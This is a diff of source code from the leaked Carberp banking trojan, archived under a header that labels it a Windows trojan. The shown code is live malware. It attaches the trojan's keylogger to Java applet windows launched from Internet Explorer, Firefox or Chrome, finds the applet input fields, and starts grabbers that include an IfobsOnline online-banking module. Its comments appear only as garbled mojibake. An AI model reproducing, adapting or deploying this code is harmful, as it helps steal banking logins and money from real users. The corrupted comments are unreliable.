@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -14,7 +25,7 @@ void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char
 
 
 //--------------------------------------------------------
-//  Массив имён классов строк ввода в ява аплетах
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------------
 const static DWORD JavaAppletEditClassNameHashes[] = {0xCB934F4 /* edit */,
 													  0x7D5D13E5 /* richedit20w */,
@@ -25,7 +36,7 @@ const static PCHAR SunAvtCanvasWnd = "SunAwtCanvas";
 
 
 
-// Окно аплета
+// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 HWND JavaAppletWnd = 0 ;
 
 
@@ -45,12 +56,12 @@ void WINAPI JavaAppletShowWndEvent(PKeyLogger Logger, DWORD EventID,
 
     if (JavaAppletWnd == SW->Window) return;
 
-	// Массив окон на которые мы должны отреагировать
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	const static DWORD KnownWindows[] = {JAVAWND_SUNAWTFRAME,
 										 JAVAWND_SUNAWTDIALOG,
 										 0};
 
-	// Проверяем отображаемое окно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	bool IsKnownWindow = false;
 	DWORD Hash = GetWndClassHash(SW->Window, true);
 
@@ -61,7 +72,7 @@ void WINAPI JavaAppletShowWndEvent(PKeyLogger Logger, DWORD EventID,
 			break;
 		}
 
-	// Поймали нужное окно
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (IsKnownWindow)
 	{
 		PCHAR URL = GetURLFromJavaProcess();
@@ -76,8 +87,8 @@ void WINAPI JavaAppletShowWndEvent(PKeyLogger Logger, DWORD EventID,
 
 
 //-----------------------------------------------
-//  Фугкция инициализирует систему граберов в
-//  ява аплетах
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------
 bool InitializeJavaAppletGrabbers()
 {
@@ -85,15 +96,15 @@ bool InitializeJavaAppletGrabbers()
 
 
 	PKeyLogger KLG = KeyLogger::GetKeyLogger();
-	// Запускаемся только в процессе ява созданным из под процесса
-	// Интернет Эксплорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!KLG || KLG->Process != PROCESS_JAVA)
 		return false;     
 
 	DWORD PID = GetParentPID();   
 	DWORD Hash = GetHashForPid(PID);    
-	// Пока проверяем принадлежность явы к процессам браузеров
-	// по массиву хэшей
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	const static DWORD Hashes[] = {PROCESS_HASH_IE,
 								   PROCESS_HASH_FIREFOX,
 								   PROCESS_HASH_CHROME,
@@ -109,7 +120,7 @@ bool InitializeJavaAppletGrabbers()
 
 	if (ParentIsBrowser)
 	{
-		// Подключаемся к событию отображения окна
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		KeyLogger::ConnectEventHandler(KLE_AFTER_SHOW_WND, JavaAppletShowWndEvent);
 	}
 	return ParentIsBrowser;
@@ -118,9 +129,9 @@ bool InitializeJavaAppletGrabbers()
 
 
 //-----------------------------------------------
-//  IsJavaEditWindow - Функция возвращает истину
-//                     окно является редактором
-//                     ввода ява аплета
+//  IsJavaEditWindow - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//                     пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//                     пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------
 bool IsJavaEditWindow(HWND Wnd)
 {
@@ -134,9 +145,9 @@ bool IsJavaEditWindow(HWND Wnd)
 }
 
 //-----------------------------------------------
-//  IsJavaLabelWindow - Функция возвращает истину
-//                     окно является обычной
-//                     надписью
+//  IsJavaLabelWindow - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//                     пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//                     пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------
 bool IsJavaLabelWindow(HWND Wnd)
 {
@@ -147,7 +158,7 @@ bool IsJavaLabelWindow(HWND Wnd)
 
 
 //-----------------------------------------------
-//  GetSunAwtCanvasWnd - Функция возвращает окно
+//  GetSunAwtCanvasWnd - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //                       SunAwtCanvas
 //-----------------------------------------------
 HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd)
@@ -164,7 +175,7 @@ HWND GetSunAwtCanvasWnd(HWND SunAwtFrameWnd)
 //============================================================================
 void ActivateJavaAppletGrabber(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWindow)
 {
-	// Инициализируем IfobsOnline
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IfobsOnline
 	#ifdef IfobsOnlineH
 		IfobsOnline::Initialize(JafaFrameWnd, ClassWndHash, URL, IsChildWindow);
 	#endif
